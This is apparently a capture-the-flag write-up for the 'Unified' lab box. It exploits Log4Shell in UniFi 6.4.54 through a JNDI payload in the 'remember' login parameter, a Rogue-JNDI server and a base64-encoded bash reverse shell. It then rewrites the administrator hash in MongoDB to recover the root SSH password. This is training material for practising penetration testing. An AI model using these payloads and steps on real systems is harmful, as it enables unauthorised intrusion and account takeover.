# Unified Write-up  
Prepared by: pwninx

## Introduction
This writeup explores the effects of exploiting Log4J in a very well known network appliance monitoring system called "UniFi". This box will show you how to set up and install the necessary packages and tools to exploit UniFi by abusing the Log4J vulnerability and manipulate a POST header called `remember`, giving you a reverse shell on the machine. You'll also change the administrator's password by altering the hash saved in the MongoDB instance that is running on the system, which will allow access to the administration panel and leads to the disclosure of the administrator's SSH password.

---

## Enumeration
The first step is to scan the target IP address with Nmap to check what ports are open. We'll do this with the help of a program called Nmap. Here is a quick explanation of what each flag is and what it does.

- **-sC**: Performs a script scan using the default set of scripts.  
- **-sV**: Version detection  
- **-v**: Increases verbosity  

The scan reveals port **8080** open running an HTTP proxy. The proxy appears to redirect requests to port **8443**, which seems to be running an SSL web server.

The page title on 8443 is **"UniFi Network"** showing version **6.4.54**.

A Google search for **UniFi 6.4.54 exploit** reveals articles discussing Log4J exploitation in this version.

References:  
https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi  
https://nvd.nist.gov/vuln/detail/CVE-2021-44228  
https://www.hackthebox.com/blog/Whats-Going-On-With-Log4j-Exploitation  

This vulnerability allows OS command injection.

To test for vulnerability, intercept the login POST request using FoxyProxy + BurpSuite, then modify the `remember` parameter.

---

## Exploitation
Send incorrect credentials "`test:test`" just to capture the request.

Forward to **Repeater** (Ctrl + R).

Insert JNDI payload into the `remember` parameter.  
Because the POST body is JSON, the payload must be wrapped in quotes so it is parsed as a string:

```
"${jndi:ldap://<Your-IP>/whatever}"
```

Even if the response shows error, the payload may still execute.

---

### Start tcpdump to detect callback:
```bash
sudo tcpdump -i tun0 port 389
```

Send the request > if you see packets → **vulnerable**.

---

### Install tools needed for full RCE:
- OpenJDK  
- Maven  

```bash
sudo apt-get install maven
```

Check version:

```bash
mvn -v
```

Clone Rogue-JNDI:

```bash
git clone https://github.com/veracode-research/rogue-jndi
cd rogue-jndi
mvn package
```

This builds:  
`target/RogueJndi-1.1.jar`

---

## Build Reverse Shell Payload
Base64 encode reverse shell:

```bash
echo 'bash -c bash -i >&/dev/tcp/<Your-IP>/4444 0>&1' | base64
```

Start Rogue-JNDI:

```bash
java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,BASE64_HERE}|{base64,-d}|{bash,-i}" --hostname "<Your-IP>"
```

Start listener:

```bash
nc -lvp 4444
```

Modify Burp payload:

```
${jndi:ldap://<Your-IP>:1389/o=tomcat}
```

Send.  
Rogue-JNDI receives connection → reverse shell spawns.

Upgrade shell:

```bash
script /dev/null -c bash
```

Navigate and read user flag:

```bash
cd /home/Michael
cat user.txt
```

---

## Privilege Escalation

Check MongoDB:

```bash
ps aux | grep mongo
```

Connect to DB:

```bash
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
```

Look for user `"Administrator"` and field `"x_shadow"`.

### Generate SHA-512 password hash:
```bash
mkpasswd -m sha-512 Password1234
```

Replace admin hash:

```bash
mongo --port 27117 ace --eval 'db.admin.update({"_id": ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"<NEW_HASH>"}})'
```

Verify updated hash.

Login to UniFi admin panel using your new password.

---

## Getting Root Password
Navigate to:

**Settings → Site → SSH Authentication**

You will see plaintext root password:

```
NotACrackablePassword4U2022
```

SSH into machine:

```bash
ssh root@10.129.96.149
```

Read root flag:

```bash
cat /root/root.txt
```

---

## End
Congratulations — you have completed the Unified box.
